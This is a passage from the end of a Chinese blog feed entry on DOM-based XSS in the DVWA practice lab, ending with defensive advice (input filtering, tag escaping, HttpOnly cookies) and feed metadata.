alt="mark"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>通过对dvwa三种类型xss的学习，可以看出预防xss的方法不光要做到过滤一切用户有害输入，转义可能引起跨站漏洞的标签，最重要的是重http层做到防护，给cookie设置httponly属性，使cookie不能被javascript读取，才能有效防止用户cookie被盗用的问题</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa-DOM型XSS&quot;&gt;&lt;a href=&quot;#dvwa-DOM型XSS&quot; class=&quot;headerlink&quot; title=&quot;dvwa DOM型XSS&quot;&gt;&lt;/a&gt;dvwa DOM型XSS&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;he
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
